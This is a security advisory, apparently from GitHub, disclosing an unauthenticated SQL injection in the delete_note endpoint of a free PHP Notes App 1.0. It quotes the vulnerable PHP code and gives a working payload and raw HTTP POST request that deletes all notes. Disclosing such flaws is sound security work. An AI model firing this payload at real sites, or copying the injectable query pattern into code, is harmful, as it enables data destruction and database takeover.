## Vulnerability Details

**Credits**: 
> Reigz Macolor (https://github.com/reigz/)<br/>

**Tested On**:
> [Notes App using PHP (OOP), jQuery, and Bootstrap 1.0](https://www.sourcecodester.com/php/16055/notes-app-using-php-oop-jquery-and-bootstrap-free-source-code.html) <br/>

**Affected Version**:
> Notes App using PHP (OOP), jQuery, and Bootstrap 1.0

**Affected Site Page**: 
> /ajax-api.php?action=delete_note<br/>

**Affected Code**: 
> </ajax-api.php [CLASS delete_note()]> <br/>

```php
    function delete_note(){
        extract($_POST);
        if(!isset($id)){
            $resp['status'] = 'error';
            $resp['error'] = "Invalid Note ID";
        }else{
            $sql = "DELETE FROM `notes` where `id` = '{$id}'";
            $delete = $this->conn->query($sql);
            if($delete){
                $resp['status'] = 'success';
                $_SESSION['message']['success'] = "Note Data has been deleted successfully.";
            }else{
                $resp['status'] = 'success';
                $resp['error'] = "Deleting Note Data failed. Error: ". $this->conn->error;
            }
        }
        return json_encode($resp);
    }
```

**Related CWE:**
> [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)

## **Details:**
> Allows SQL Injection by placing untrusted code executing a query on the backend, for the POC all Notes are deleted without any authentication

![image](https://github.com/smurf-reigz/security/assets/48426940/243d42ad-4cc8-4dcb-bce8-ded837dae901)

Execute Delete query using payload `1337'+or+1=1--+` via the `id` parameter.

```http 
POST /php-notes/ajax-api.php?action=delete_note HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 18

id=1337'+or+1=1--+
```

> DELETES all notes without authentication.

![image](https://github.com/smurf-reigz/security/assets/48426940/c4adb9d0-e6f1-43f5-a340-dfe199913333)

## **Vulnerability Impact:**
> As an attacker, can do the following:
> 1. Run any database query and have same permission as the web application (default for this Web Application is root).
